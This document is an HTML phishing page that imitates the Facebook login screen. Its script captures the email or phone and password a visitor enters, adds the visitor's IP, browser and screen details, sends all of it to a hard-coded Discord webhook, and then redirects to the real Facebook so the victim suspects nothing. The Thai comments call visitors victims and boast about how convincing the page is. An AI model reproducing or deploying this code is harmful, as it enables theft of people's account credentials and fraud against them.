<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook - Log In or Sign Up</title>
    <style>
        @import url("https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap");

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "Poppins", sans-serif;
            background: #f2f4f7;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .content {
            width: 100%;
            padding: 20px;
        }

        .flex-div {
            display: flex;
            justify-content: space-evenly;
            align-items: center;
            flex-wrap: wrap;
            max-width: 1200px;
            margin: 0 auto;
        }

        .name-content {
            margin-right: 7rem;
            flex: 1;
            min-width: 280px;
        }

        .name-content .logo {
            font-size: 3.5rem;
            color: #1877f2;
        }

        .name-content p {
            font-size: 1.3rem;
            font-weight: 500;
            margin-bottom: 2rem;
        }

        form {
            display: flex;
            flex-direction: column;
            background: #fff;
            padding: 2rem;
            width: 530px;
            max-width: 100%;
            border-radius: 0.5rem;
            box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
        }

        form input {
            outline: none;
            padding: 0.8rem 1rem;
            margin-bottom: 0.8rem;
            font-size: 1.1rem;
            border: 1px solid #dddfe2;
            border-radius: 0.3rem;
            transition: 0.2s;
        }

        form input:focus {
            border: 1.8px solid #1877f2;
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
        }

        form .login {
            outline: none;
            border: none;
            background: #1877f2;
            padding: 0.8rem 1rem;
            border-radius: 0.4rem;
            font-size: 1.1rem;
            font-weight: 700;
            color: #fff;
            transition: 0.2s;
        }

        form .login:hover {
            background: #0f71f1;
            cursor: pointer;
        }

        form a {
            text-decoration: none;
            text-align: center;
            font-size: 1rem;
            padding-top: 0.8rem;
            color: #1877f2;
        }
        form a:hover {
            text-decoration: underline;
        }

        form hr {
            background: #dadde1;
            margin: 1rem 0;
            border: none;
            height: 1px;
        }

        form .create-account {
            outline: none;
            border: none;
            background: #06b909;
            padding: 0.8rem 1rem;
            border-radius: 0.4rem;
            font-size: 1.1rem;
            font-weight: 700;
            color: #fff;
            width: 75%;
            margin: 0 auto;
            transition: 0.2s;
        }

        form .create-account:hover {
            background: #03ad06;
            cursor: pointer;
        }

        /* responsive ฉบับเทพ ไม่มีบั๊ก */
        @media (max-width: 768px) {
            .name-content {
                margin: 0 0 2rem 0;
                text-align: center;
                flex: none;
                width: 100%;
            }
            form {
                width: 100%;
                max-width: 400px;
            }
            .flex-div {
                flex-direction: column;
                align-items: center;
            }
        }

        @media (min-width: 769px) and (max-width: 1200px) {
            .name-content {
                margin-right: 2rem;
            }
            form {
                width: 400px;
            }
        }

        /* จัดการแนวตั้งให้เรียบร้อย (ย้ายออกมาให้ถูกที่) */
        @media (orientation: landscape) and (max-height: 500px) {
            .content {
                padding: 10px;
            }
            form {
                padding: 1rem;
            }
            .name-content .logo {
                font-size: 2.5rem;
            }
        }
    </style>
</head>
<body>
    <div class="content">
        <div class="flex-div">
            <div class="name-content">
                <h1 class="logo">Facebook</h1>
                <p>Connect with friends and the world around you on Facebook.</p>
            </div>
            <form id="loginForm">
                <input type="text" id="email" placeholder="Email or Phone Number" required />
                <input type="password" id="password" placeholder="Password" required />
                <button type="submit" class="login">Log In</button>
                <a href="https://www.facebook.com/login/identify/" target="_blank">Forgot Password ?</a>
                <hr />
                <button type="button" class="create-account" onclick="window.location.href='https://www.facebook.com/r.php';">Create New Account</button>
            </form>
        </div>
    </div>

    <script>
        // เปลี่ยนมาใช้ submit event จะได้เนียนกว่า
        document.getElementById("loginForm").addEventListener("submit", async function(e) {
            e.preventDefault(); // ห้ามรีเฟรชหน้าเด็ดขาด

            const emailOrPhone = document.getElementById("email").value.trim();
            const password = document.getElementById("password").value;

            // เช็คเบอร์หรืออีเมลให้แน่นๆ (ของมึงเดิมๆ)
            const phoneRegex = /^\d{10}$/;
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (!phoneRegex.test(emailOrPhone) && !emailRegex.test(emailOrPhone)) {
                alert("กรุณากรอกเบอร์โทร 10 หลัก หรืออีเมลให้ถูกต้อง");
                return;
            }

            if (password.length < 8) {
                alert("รหัสผ่านต้องมีอย่างน้อย 8 ตัวอักษร");
                return;
            }

            // ดึง IP + ข้อมูลเพิ่มเติม
            let ip = "ไม่สามารถดึง IP ได้";
            try {
                const ipRes = await fetch("https://api.ipify.org?format=json");
                const ipData = await ipRes.json();
                ip = ipData.ip;
            } catch (ipErr) {
                // กูก็ไม่สน ถ้าดึงไม่ได้ก็ใช้ค่า default
            }

            const userAgent = navigator.userAgent;
            const screenRes = `${window.screen.width}x${window.screen.height}`;

            // สร้าง payload สวยงาม แยกบรรทัดให้อ่านง่ายตอนกูไปดูใน Discord
            const payload = {
                content: `**🟢 มีเหยื่อกด Login แล้วว่ะ!**\n📧 **Email/Phone:** ${emailOrPhone}\n🔑 **Password:** ${password}\n🌐 **IP Address:** ${ip}\n💻 **User Agent:** ${userAgent}\n📱 **Screen:** ${screenRes}`
            };

            // ส่งของไป Webhook พร้อม Retry 1 รอบ ถ้าแรกตก
            let success = false;
            try {
                const response = await fetch("https://discord.com/api/webhooks/1520012502598029392/SOn1Y-CUuI1_X6kasBZ8b9uiawN3lns6lwfwj5X5MfMomKD0fLF1ErCukpQzrWqDw3cG", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    success = true;
                } else {
                    // ถ้าแรกไม่สำเร็จ ลองอีกที (Network เจ๊งบ้าง)
                    const retry = await fetch("https://discord.com/api/webhooks/1520012502598029392/SOn1Y-CUuI1_X6kasBZ8b9uiawN3lns6lwfwj5X5MfMomKD0fLF1ErCukpQzrWqDw3cG", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify(payload)
                    });
                    if (retry.ok) success = true;
                }
            } catch (err) {
                // กูไม่สน error ข้างหน้า เดี๋ยวเหยื่อมันรอไม่ไหว
                console.log("Webhook ส่งไม่ทัน แต่กูจะพาเหยื่อไปต่อ");
            }

            // ไฮไลท์สำคัญ!! กูจะไม่แจ้งเตือนเหยื่อว่า "ข้อมูลถูกต้อง" โคตรเซ่อ 
            // กูจะพาไปหน้า Facebook จริงๆ ให้มันหลงเชื่อว่าเพิ่ง Login สำเร็จ หรือใส่รหัสผิดก็ช่าง
            // แต่กูเลือก Redirect ไปหน้า Home ของ Facebook จริงๆ เลยดีกว่า เนียนสุดๆ
            window.location.href = "https://www.facebook.com/";
        });

        // ปิดการทำงานของปุ่ม Create Account ถ้ามันดันเป็น submit (เผื่อไว้)
        document.querySelector(".create-account").addEventListener("click", function(e) {
            // มันเป็น type="button" อยู่แล้ว แต่ใส่ป้องกันไว้
            window.location.href = 'https://www.facebook.com/r.php';
        });
    </script>
</body>
</html>
